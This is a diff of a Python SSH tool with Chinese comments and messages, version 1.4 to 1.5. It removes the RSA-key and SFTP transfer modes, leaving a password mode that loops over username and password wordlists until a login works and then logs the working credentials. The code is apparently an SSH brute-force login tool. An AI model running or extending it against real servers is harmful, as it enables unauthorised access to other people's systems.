@@ -20,8 +20,8 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 
 # 程序banner
 BANNER = """
-SSH连接和文件传输工具
-版本: 1.4
+SSH连接工具
+版本: 1.5
 时间: 2024/7/23
 """
 
@@ -38,22 +38,13 @@ def get_config(section, key):
     config.read(config_path)
     return config.get(section, key)
 
-def ssh_connect(hostname, port, username, password=None, key_filename=None):
+def ssh_connect(hostname, port, username, password):
     """建立SSH连接"""
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        if key_filename:
-            ssh_client.connect(hostname, port=port, username=username, key_filename=key_filename)
-        else:
-            ssh_client.connect(hostname, port=port, username=username, password=password)
+        ssh_client.connect(hostname, port=port, username=username, password=password)
         return ssh_client
-    except paramiko.AuthenticationException:
-        return None
-    except paramiko.SSHException:
-        return None
-    except socket.error:
-        return None
     except Exception:
         return None
 
@@ -93,89 +84,6 @@ def ssh_client_connection(hostname):
             time.sleep(5)  # 在每次尝试之间添加5秒延迟
     
     logging.warning(f"所有组合都已尝试，连接失败。总共失败 {failed_attempts} 次")
-    return False
-
-def ssh_rsa_connection(hostname):
-    """尝试SSH RSA密钥连接"""
-    path = input("请输入您的id_rsa文件的绝对路径：")
-    flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n：").lower()
-
-    with open("username.txt", 'r') as f:
-        usernames = f.read().splitlines()
-
-    failed_attempts = 0
-
-    if flag1 == 'y':
-        with open("password.txt", 'r') as f:
-            passwords = f.read().splitlines()
-        for password in passwords:
-            for username in usernames:
-                ssh_client = ssh_connect(hostname, 22, username, key_filename=path, password=password)
-                if ssh_client:
-                    stdin, stdout, stderr = ssh_client.exec_command('hostname', timeout=10)
-                    print(stdout.read().decode())
-                    ssh_client.close()
-                    logging.info(f"连接成功！用户名: {username}, 密码: {password}")
-                    logging.info(f"在成功之前失败了 {failed_attempts} 次")
-                    return True
-                failed_attempts += 1
-    elif flag1 == 'n':
-        for username in usernames:
-            ssh_client = ssh_connect(hostname, 22, username, key_filename=path)
-            if ssh_client:
-                stdin, stdout, stderr = ssh_client.exec_command('hostname', timeout=10)
-                print(stdout.read().decode())
-                ssh_client.close()
-                logging.info(f"连接成功！用户名: {username}")
-                logging.info(f"在成功之前失败了 {failed_attempts} 次")
-                return True
-            failed_attempts += 1
-    else:
-        logging.error("输入无效！")
-    
-    logging.warning(f"RSA密钥连接失败。总共失败 {failed_attempts} 次")
-    return False
-
-def trans_file(hostname):
-    """文件传输功能"""
-    with open("username.txt", 'r') as f:
-        usernames = f.read().splitlines()
-    with open("password.txt", 'r') as f:
-        passwords = f.read().splitlines()
-
-    flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2：")
-    
-    failed_attempts = 0
-
-    for username in usernames:
-        for password in passwords:
-            try:
-                transport = paramiko.Transport((hostname, 22))
-                transport.connect(username=username, password=password)
-                sftp = paramiko.SFTPClient.from_transport(transport)
-
-                if flag2 == '1':
-                    local_path = input("请输入您要上传的本地文件的绝对路径：")
-                    remote_path = input("请输入您要上传的位置的绝对路径：")
-                    sftp.put(localpath=local_path, remotepath=remote_path)
-                    logging.info("上传成功！")
-                elif flag2 == '2':
-                    local_path = input("请输入您要保存的位置的绝对路径：")
-                    remote_path = input("请输入您要获取的文件的绝对路径：")
-                    sftp.get(remotepath=remote_path, localpath=local_path)
-                    logging.info("下载成功！")
-                else:
-                    logging.error("输入无效！")
-                    return False
-
-                transport.close()
-                logging.info(f"连接成功！用户名: {username}, 密码: {password}")
-                logging.info(f"在成功之前失败了 {failed_attempts} 次")
-                return True
-            except Exception:
-                failed_attempts += 1
-    
-    logging.warning(f"文件传输失败。总共失败 {failed_attempts} 次")
     return False
 
 def send_msg():
@@ -229,23 +137,14 @@ def main():
     """主函数"""
     print(BANNER)
 
-    if len(sys.argv) != 3:
-        print("用法: python script.py <-C|-R|-T> <hostname>")
+    if len(sys.argv) != 2:
+        print("用法: python script.py <hostname>")
         sys.exit(1)
 
-    type_arg, hostname = sys.argv[1], sys.argv[2]
+    hostname = sys.argv[1]
 
     try:
-        if type_arg == '-C':
-            success = ssh_client_connection(hostname)
-        elif type_arg == '-R':
-            success = ssh_rsa_connection(hostname)
-        elif type_arg == '-T':
-            success = trans_file(hostname)
-        else:
-            logging.error("无效参数。请使用 -C, -R, 或 -T。")
-            sys.exit(1)
-
+        success = ssh_client_connection(hostname)
         if success:
             send_msg()
         else:
